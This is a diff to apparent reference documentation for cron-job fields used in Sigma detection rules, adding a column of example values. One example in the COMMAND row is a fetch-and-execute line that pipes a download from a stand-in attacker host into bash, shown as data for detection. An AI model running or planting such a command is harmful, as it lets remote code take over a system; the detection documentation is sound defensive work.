@@ -7,12 +7,12 @@
 Field names are shown in **UPPERCASE** as used in Sigma rules.
 The lowercase JSON name is shown in parentheses for reference.
 
-| Sigma Field | JSON Name | Type | Required | Description |
-|-------------|-----------|------|----------|-------------|
-| `COMMAND` | `command` | string | ✅ |  |
-| `SCHEDULE` | `schedule` | string | ✅ |  |
-| `TYPE` | `type` | string | ✅ |  |
-| `USER` | `user` | string | ✅ |  |
+| Sigma Field | JSON Name | Type | Required | Description | Example Values |
+|-------------|-----------|------|----------|-------------|----------------|
+| `COMMAND` | `command` | string | ✅ |  | `/usr/bin/certbot renew`, `curl -s http://evil.com/payload | bash`, `/opt/backup.sh` |
+| `SCHEDULE` | `schedule` | string | ✅ |  | `0 2 * * *`, `*/5 * * * *`, `@daily` |
+| `TYPE` | `type` | string | ✅ |  | `cron job` |
+| `USER` | `user` | string | ✅ |  | `root`, `neo` |
 
 ### Nested Field Reference (Sigma Pipe Notation)
 
